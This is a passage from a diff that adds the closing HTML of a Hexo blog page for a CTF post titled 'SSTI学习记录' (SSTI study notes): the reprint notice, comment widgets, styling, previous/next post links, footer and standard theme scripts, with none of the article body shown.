+                    <a href="http://atmujie.github.io/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">http://atmujie.github.io/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Atmujie</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+        <div class="disqus-card card" data-aos="fade-up">
+    <div id="disqus_thread" class="card-content">
+        <noscript>Please enable JavaScript to view the
+            <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+    </div>
+</div>
+
+<script type="text/javascript">
+    disqus_config = function () {
+        this.page.url = 'http://atmujie.github.io/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/';
+        this.page.identifier = '/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/';
+        this.page.title = 'SSTI学习记录';
+    };
+    let disqus_shortname = '';
+
+    (function () { // DON'T EDIT BELOW THIS LINE
+        let d = document, s = d.createElement('script');
+        // 如：s.src = 'https://blinkfox.disqus.com/embed.js';
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'GHiPEgESACHszUJMqTqLWQtF-gzGzoHsz',
+        appKey: 'Lm6vLWBnRM3KIlhuo4tqDNDq',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/06/08/SSTI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="SSTI学习记录">
+                        
+                        <span class="card-title">SSTI学习记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/05/22/rce%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="rce学习小结">
+                        
+                        <span class="card-title">rce学习小结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Atmujie
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+<!-- 代码块功能依赖 -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script> -->
+
+<!-- 代码语言 -->
+<!--  -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script> -->
+<!--  -->
+
+<!-- 代码块复制 -->
+<!-- 
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+ -->
+
+<!-- 代码块收缩 -->
+<!--  -->
+
+<!-- 代码块折行 -->
+<!-- 
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+ -->
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">Atmujie</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/atmujie" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
